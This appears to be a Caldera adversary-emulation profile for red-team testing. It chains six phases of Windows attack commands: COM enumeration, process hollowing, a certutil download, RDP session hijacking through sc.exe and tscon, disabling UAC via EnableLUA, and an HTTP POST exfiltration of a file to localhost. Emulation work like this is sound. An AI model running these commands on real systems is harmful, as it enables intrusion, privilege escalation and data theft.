adversary_id: custom_adversary_profile__None__Survey_Paper_APT_Attack_Six_Phases__2023-10-19-22_43_15
name: Custom Adversary Profile
description: [['atomic__reconnaissance'], ['atomic__initial_access'], ['stockpile__command-and-control', 'atomic__command-and-control'], ['stockpile__lateral-movement', 'atomic__lateral-movement'], ['stockpile__privilege_escalation', 'atomic__privilege_escalation'], ['stockpile__exfiltration', 'atomic__exfiltration']]
atomic_ordering:
- afe32d76ebb32d20d0b43707bf271beb # ('afe32d76ebb32d20d0b43707bf271beb', 'None', 'validate_me') ; {'description': 'This test is designed to enumerate the COM objects listed in HKCR, then output their methods and CLSIDs to a text file.\nAn adversary could then use this information to identify COM objects that might be vulnerable to abuse, such as using them to spawn arbitrary processes. \nSee: https://www.mandiant.com/resources/hunting-com-objects', 'tactic': 'reconnaissance', 'technique': {'attack_id': 'T1592.002', 'name': 'Gather Victim Host Information: Software'}, 'platforms': {'windows': {'psh': {'cleanup': 'remove-item $env:temp\\T1592.002Test1.txt -force -erroraction silentlycontinue; remove-item $env:temp\\clsids.txt -force -erroraction silentlycontinue', 'command': 'New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR; Get-ChildItem -Path HKCR:\\CLSID -Name | Select -Skip 1 > $env:temp\\clsids.txt; ForEach($CLSID in Get-Content "$env:temp\\clsids.txt"); {try{write-output "$($Position)-$($CLSID)"; write-output "------------"| out-file $env:temp\\T1592.002Test1.txt -append; write-output $($CLSID)| out-file $env:temp\\T1592.002Test1.txt -append; $handle=[activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID)); $handle | get-member -erroraction silentlycontinue | out-file $env:temp\\T1592.002Test1.txt -append; $position += 1} catch{}}', 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['afe32d76ebb32d20d0b43707bf271beb', 'None', 'validate_me'], 'plugin': 'atomic'}
- 06246b2963b7a0158e347dab3169174e # ('06246b2963b7a0158e347dab3169174e', 'None', 'validate_me') ; {'description': 'This test uses PowerShell to create a Hollow from a PE on disk with explorer as the parent.\nCredit to FuzzySecurity (https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1)\n', 'tactic': 'multiple', 'technique': {'attack_id': 'T1055.012', 'name': 'Process Injection: Process Hollowing'}, 'platforms': {'windows': {'psh': {'cleanup': 'Stop-Process -Name "notepad" -ErrorAction Ignore', 'command': '. cd6d01_Start-Hollow.ps1; $ppid=Get-Process explorer | select -expand id; Start-Hollow -Sponsor "C:\\Windows\\System32\\notepad.exe" -Hollow "C:\\Windows\\System32\\cmd.exe" -ParentPID $ppid -Verbose', 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': ['cd6d01_Start-Hollow.ps1']}}}, 'id__dependence__fact': ['06246b2963b7a0158e347dab3169174e', 'None', 'validate_me'], 'plugin': 'atomic'}
- 810cb98b4ed5b3a026e48ffa35fef7e7 # ('810cb98b4ed5b3a026e48ffa35fef7e7', 'None', 'validate_me') ; {'description': 'Use certutil -verifyctl argument to download a file from the web. Note - /verifyctl also works!\n', 'tactic': 'command-and-control', 'technique': {'attack_id': 'T1105', 'name': 'Ingress Tool Transfer'}, 'platforms': {'windows': {'psh': {'cleanup': 'Remove-Item "certutil-$(Get-Date -format yyyy_MM_dd)" -Force -Recurse -ErrorAction Ignore', 'command': '$datePath = "certutil-$(Get-Date -format yyyy_MM_dd)"; New-Item -Path $datePath -ItemType Directory; Set-Location $datePath; certutil -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt; Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }', 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['810cb98b4ed5b3a026e48ffa35fef7e7', 'None', 'validate_me'], 'plugin': 'atomic'}
- 153663bd4b750eca453d844cda61a37a # ('153663bd4b750eca453d844cda61a37a', 'None', 'None') ; {'description': '[RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6) - how to hijack RDS and RemoteApp sessions transparently to move through an organization\n', 'tactic': 'lateral-movement', 'technique': {'attack_id': 'T1563.002', 'name': 'Remote Service Session Hijacking: RDP Hijacking'}, 'platforms': {'windows': {'cmd': {'cleanup': 'sc.exe delete sesshijack >nul 2>&1', 'command': 'query user && sc.exe create sesshijack binpath= "cmd.exe /k tscon 1337 /dest:rdp-tcp#55" && net start sesshijack', 'payloads': []}}}, 'id__dependence__fact': ['153663bd4b750eca453d844cda61a37a', 'None', 'None'], 'plugin': 'atomic'}
- 665432a4-42e7-4ee1-af19-a9a8c9455d0c # ('665432a4-42e7-4ee1-af19-a9a8c9455d0c', 'None', 'None') ; {'description': 'Set a registry key to allow UAC bypass', 'tactic': 'privilege-escalation', 'technique': {'attack_id': 'T1548.002', 'name': 'Abuse Elevation Control Mechanism: Bypass User Access Control'}, 'platforms': {'windows': {'psh': {'command': 'New-ItemProperty -Path HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system -Name EnableLUA -PropertyType DWord -Value 0 -Force\n'}}}, 'id__dependence__fact': ['665432a4-42e7-4ee1-af19-a9a8c9455d0c', 'None', 'None'], 'plugin': 'stockpile'}
- 2e4b17949c4163f1cefec2e7fbee3e2b # ('2e4b17949c4163f1cefec2e7fbee3e2b', 'None', 'validate_me') ; {'description': 'Exfiltration of specified file over HTTP.\nUpon successful execution, powershell will invoke web request using POST method to exfiltrate notepad.exe to a remote address (default http://127.0.0.1). Results will be via stdout.\n', 'tactic': 'exfiltration', 'technique': {'attack_id': 'T1048.003', 'name': 'Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol'}, 'platforms': {'windows': {'psh': {'cleanup': '', 'command': '$content = Get-Content C:\\Windows\\System32\\notepad.exe; Invoke-WebRequest -Uri http://127.0.0.1 -Method POST -Body $content', 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['2e4b17949c4163f1cefec2e7fbee3e2b', 'None', 'validate_me'], 'plugin': 'atomic'}
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
tags: []